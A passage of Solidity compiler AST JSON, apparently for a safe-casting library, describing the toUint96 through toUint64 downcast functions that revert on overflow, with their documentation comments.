tring":"uint104"}},"visibility":"internal"}],"src":"10847:9:7"},"scope":5451,"src":"10791:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4272,"nodeType":"Block","src":"11360:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4259,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4253,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4248,"src":"11374:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4256,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"11387:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint96_$","typeString":"type(uint96)"},"typeName":{"id":4255,"name":"uint96","nodeType":"ElementaryTypeName","src":"11387:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint96_$","typeString":"type(uint96)"}],"id":4254,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"11382:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4257,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11382:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint96","typeString":"type(uint96)"}},"id":4258,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"11395:3:7","memberName":"max","nodeType":"MemberAccess","src":"11382:16:7","typeDescriptions":{"typeIdentifier":"t_uint96","typeString":"uint96"}},"src":"11374:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4266,"nodeType":"IfStatement","src":"11370:103:7","trueBody":{"id":4265,"nodeType":"Block","src":"11400:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3936","id":4261,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11452:2:7","typeDescriptions":{"typeIdentifier":"t_rational_96_by_1","typeString":"int_const 96"},"value":"96"},{"id":4262,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4248,"src":"11456:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_96_by_1","typeString":"int_const 96"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4260,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"11421:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4263,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11421:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4264,"nodeType":"RevertStatement","src":"11414:48:7"}]}},{"expression":{"arguments":[{"id":4269,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4248,"src":"11496:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4268,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"11489:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint96_$","typeString":"type(uint96)"},"typeName":{"id":4267,"name":"uint96","nodeType":"ElementaryTypeName","src":"11489:6:7","typeDescriptions":{}}},"id":4270,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11489:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint96","typeString":"uint96"}},"functionReturnParameters":4252,"id":4271,"nodeType":"Return","src":"11482:20:7"}]},"documentation":{"id":4246,"nodeType":"StructuredDocumentation","src":"11015:276:7","text":" @dev Returns the downcasted uint96 from uint256, reverting on\n overflow (when the input is greater than largest uint96).\n Counterpart to Solidity's `uint96` operator.\n Requirements:\n - input must fit into 96 bits"},"id":4273,"implemented":true,"kind":"function","modifiers":[],"name":"toUint96","nameLocation":"11305:8:7","nodeType":"FunctionDefinition","parameters":{"id":4249,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4248,"mutability":"mutable","name":"value","nameLocation":"11322:5:7","nodeType":"VariableDeclaration","scope":4273,"src":"11314:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4247,"name":"uint256","nodeType":"ElementaryTypeName","src":"11314:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11313:15:7"},"returnParameters":{"id":4252,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4251,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4273,"src":"11352:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint96","typeString":"uint96"},"typeName":{"id":4250,"name":"uint96","nodeType":"ElementaryTypeName","src":"11352:6:7","typeDescriptions":{"typeIdentifier":"t_uint96","typeString":"uint96"}},"visibility":"internal"}],"src":"11351:8:7"},"scope":5451,"src":"11296:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4300,"nodeType":"Block","src":"11860:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4287,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4281,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4276,"src":"11874:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4284,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"11887:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint88_$","typeString":"type(uint88)"},"typeName":{"id":4283,"name":"uint88","nodeType":"ElementaryTypeName","src":"11887:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint88_$","typeString":"type(uint88)"}],"id":4282,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"11882:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4285,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11882:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint88","typeString":"type(uint88)"}},"id":4286,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"11895:3:7","memberName":"max","nodeType":"MemberAccess","src":"11882:16:7","typeDescriptions":{"typeIdentifier":"t_uint88","typeString":"uint88"}},"src":"11874:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4294,"nodeType":"IfStatement","src":"11870:103:7","trueBody":{"id":4293,"nodeType":"Block","src":"11900:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3838","id":4289,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11952:2:7","typeDescriptions":{"typeIdentifier":"t_rational_88_by_1","typeString":"int_const 88"},"value":"88"},{"id":4290,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4276,"src":"11956:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_88_by_1","typeString":"int_const 88"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4288,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"11921:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4291,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11921:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4292,"nodeType":"RevertStatement","src":"11914:48:7"}]}},{"expression":{"arguments":[{"id":4297,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4276,"src":"11996:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4296,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"11989:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint88_$","typeString":"type(uint88)"},"typeName":{"id":4295,"name":"uint88","nodeType":"ElementaryTypeName","src":"11989:6:7","typeDescriptions":{}}},"id":4298,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11989:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint88","typeString":"uint88"}},"functionReturnParameters":4280,"id":4299,"nodeType":"Return","src":"11982:20:7"}]},"documentation":{"id":4274,"nodeType":"StructuredDocumentation","src":"11515:276:7","text":" @dev Returns the downcasted uint88 from uint256, reverting on\n overflow (when the input is greater than largest uint88).\n Counterpart to Solidity's `uint88` operator.\n Requirements:\n - input must fit into 88 bits"},"id":4301,"implemented":true,"kind":"function","modifiers":[],"name":"toUint88","nameLocation":"11805:8:7","nodeType":"FunctionDefinition","parameters":{"id":4277,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4276,"mutability":"mutable","name":"value","nameLocation":"11822:5:7","nodeType":"VariableDeclaration","scope":4301,"src":"11814:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4275,"name":"uint256","nodeType":"ElementaryTypeName","src":"11814:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11813:15:7"},"returnParameters":{"id":4280,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4279,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4301,"src":"11852:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint88","typeString":"uint88"},"typeName":{"id":4278,"name":"uint88","nodeType":"ElementaryTypeName","src":"11852:6:7","typeDescriptions":{"typeIdentifier":"t_uint88","typeString":"uint88"}},"visibility":"internal"}],"src":"11851:8:7"},"scope":5451,"src":"11796:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4328,"nodeType":"Block","src":"12360:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4315,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4309,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4304,"src":"12374:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4312,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"12387:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint80_$","typeString":"type(uint80)"},"typeName":{"id":4311,"name":"uint80","nodeType":"ElementaryTypeName","src":"12387:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint80_$","typeString":"type(uint80)"}],"id":4310,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"12382:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4313,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12382:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint80","typeString":"type(uint80)"}},"id":4314,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"12395:3:7","memberName":"max","nodeType":"MemberAccess","src":"12382:16:7","typeDescriptions":{"typeIdentifier":"t_uint80","typeString":"uint80"}},"src":"12374:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4322,"nodeType":"IfStatement","src":"12370:103:7","trueBody":{"id":4321,"nodeType":"Block","src":"12400:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3830","id":4317,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12452:2:7","typeDescriptions":{"typeIdentifier":"t_rational_80_by_1","typeString":"int_const 80"},"value":"80"},{"id":4318,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4304,"src":"12456:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_80_by_1","typeString":"int_const 80"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4316,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"12421:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4319,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12421:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4320,"nodeType":"RevertStatement","src":"12414:48:7"}]}},{"expression":{"arguments":[{"id":4325,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4304,"src":"12496:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4324,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"12489:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint80_$","typeString":"type(uint80)"},"typeName":{"id":4323,"name":"uint80","nodeType":"ElementaryTypeName","src":"12489:6:7","typeDescriptions":{}}},"id":4326,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12489:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint80","typeString":"uint80"}},"functionReturnParameters":4308,"id":4327,"nodeType":"Return","src":"12482:20:7"}]},"documentation":{"id":4302,"nodeType":"StructuredDocumentation","src":"12015:276:7","text":" @dev Returns the downcasted uint80 from uint256, reverting on\n overflow (when the input is greater than largest uint80).\n Counterpart to Solidity's `uint80` operator.\n Requirements:\n - input must fit into 80 bits"},"id":4329,"implemented":true,"kind":"function","modifiers":[],"name":"toUint80","nameLocation":"12305:8:7","nodeType":"FunctionDefinition","parameters":{"id":4305,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4304,"mutability":"mutable","name":"value","nameLocation":"12322:5:7","nodeType":"VariableDeclaration","scope":4329,"src":"12314:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4303,"name":"uint256","nodeType":"ElementaryTypeName","src":"12314:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12313:15:7"},"returnParameters":{"id":4308,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4307,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4329,"src":"12352:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint80","typeString":"uint80"},"typeName":{"id":4306,"name":"uint80","nodeType":"ElementaryTypeName","src":"12352:6:7","typeDescriptions":{"typeIdentifier":"t_uint80","typeString":"uint80"}},"visibility":"internal"}],"src":"12351:8:7"},"scope":5451,"src":"12296:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4356,"nodeType":"Block","src":"12860:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4343,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4337,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4332,"src":"12874:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4340,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"12887:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint72_$","typeString":"type(uint72)"},"typeName":{"id":4339,"name":"uint72","nodeType":"ElementaryTypeName","src":"12887:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint72_$","typeString":"type(uint72)"}],"id":4338,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"12882:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4341,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12882:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint72","typeString":"type(uint72)"}},"id":4342,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"12895:3:7","memberName":"max","nodeType":"MemberAccess","src":"12882:16:7","typeDescriptions":{"typeIdentifier":"t_uint72","typeString":"uint72"}},"src":"12874:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4350,"nodeType":"IfStatement","src":"12870:103:7","trueBody":{"id":4349,"nodeType":"Block","src":"12900:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3732","id":4345,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12952:2:7","typeDescriptions":{"typeIdentifier":"t_rational_72_by_1","typeString":"int_const 72"},"value":"72"},{"id":4346,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4332,"src":"12956:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_72_by_1","typeString":"int_const 72"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4344,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"12921:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4347,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12921:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4348,"nodeType":"RevertStatement","src":"12914:48:7"}]}},{"expression":{"arguments":[{"id":4353,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4332,"src":"12996:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4352,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"12989:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint72_$","typeString":"type(uint72)"},"typeName":{"id":4351,"name":"uint72","nodeType":"ElementaryTypeName","src":"12989:6:7","typeDescriptions":{}}},"id":4354,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12989:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint72","typeString":"uint72"}},"functionReturnParameters":4336,"id":4355,"nodeType":"Return","src":"12982:20:7"}]},"documentation":{"id":4330,"nodeType":"StructuredDocumentation","src":"12515:276:7","text":" @dev Returns the downcasted uint72 from uint256, reverting on\n overflow (when the input is greater than largest uint72).\n Counterpart to Solidity's `uint72` operator.\n Requirements:\n - input must fit into 72 bits"},"id":4357,"implemented":true,"kind":"function","modifiers":[],"name":"toUint72","nameLocation":"12805:8:7","nodeType":"FunctionDefinition","parameters":{"id":4333,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4332,"mutability":"mutable","name":"value","nameLocation":"12822:5:7","nodeType":"VariableDeclaration","scope":4357,"src":"12814:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4331,"name":"uint256","nodeType":"ElementaryTypeName","src":"12814:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12813:15:7"},"returnParameters":{"id":4336,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4335,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4357,"src":"12852:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint72","typeString":"uint72"},"typeName":{"id":4334,"name":"uint72","nodeType":"ElementaryTypeName","src":"12852:6:7","typeDescriptions":{"typeIdentifier":"t_uint72","typeString":"uint72"}},"visibility":"internal"}],"src":"12851:8:7"},"scope":5451,"src":"12796:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4384,"nodeType":"Block","src":"13360:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4371,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4365,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4360,"src":"13374:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4368,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"13387:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint64_$","typeString":"type(uint64)"},"typeName":{"id":4367,"name":"uint64","nodeType":"ElementaryTypeName","src":"13387:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint64_$","typeString":"type(uint64)"}],"id":4366,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"13382:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4369,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13382:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint64","typeString":"type(uint64)"}},"id":4370,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"13395:3:7","memberName":"max","nodeType":"MemberAccess","src":"13382:16:7","typeDescriptions":{"typeIdentifier":"t_uint64","typeString":"uint64"}},"src":"13374:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4378,"nodeType":"IfStatement","src":"13370:103:7","trueBody":{"id":4377,"nodeType":"Block","src":"13400:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3634","id":4373,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13452:2:7","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},{"id":4374,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4360,"src":"13456:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4372,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"13421:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4375,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13421:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4376,"nodeType":"RevertStatement","src":"13414:48:7"}]}},{"expression":{"arguments":[{"id":4381,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4360,"src":"13496:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4380,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"13489:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint64_$","typeString":"type(uint64)"},"typeName":{"id":4379,"name":"uint64","nodeType":"ElementaryTypeName","src":"13489:6:7","typeDescriptions":{}}},"id":4382,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13489:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint64","typeString":"uint64"}},"functionReturnParameters":4364,"id":4383,"nodeType":"Return","src":"13482:20:7"}]},"documentation":{"id":4358,"nodeType":"StructuredDocumentation","src":"13015:276:7","text":" @dev Returns the downcasted uint64 from uint256, reverting on\n overflow (when the input is greater than largest uint64).\n Counterpart to Solidity's `uint64` operator.\n Requirements:\n - input must fit into 64 bits"},"id":4385,"implemented":true,"kind":"function","modifiers":[],"name":"toUint64","nameLocation":"13305:8:7","nodeType":"FunctionDefinition","parameters":{"id":4361,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4360,"mutability":"mutable","name":"value","nameLocation":"13322:5:7","nodeType":"VariableDeclaration","scope":4385,"src":"13314:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4359,"name":"uint256","nodeType":"ElementaryTypeName","src":"13314:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"13313:15:7"},"returnParameters":{"id":4364,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4363,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4385,"src":"13352:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint64","typeString":"uint64"},"typeName":{"id":4362,"name":"uint64","nodeType":"ElementaryTypeName","src":"13352:6:7","typeDescriptions":{"typeIdentifier":"t_uint64","typeString":"uint64"}},"visibility":"internal"}],"src":"13351:8:7"},"scope":5451,"src":"13296:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4412,"nodeType":"Block","src":"13860:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4399,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4393,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4388,"src":"13874:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4396,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"13887:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint56_$","typeString":"type(uint56)"},"typeName":{"id":4395,"name":"uint56","nodeType":"ElementaryTypeName","src":"13887:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint56_$","typeString":"type(uint56)"}],"id":4394,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"13882:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () 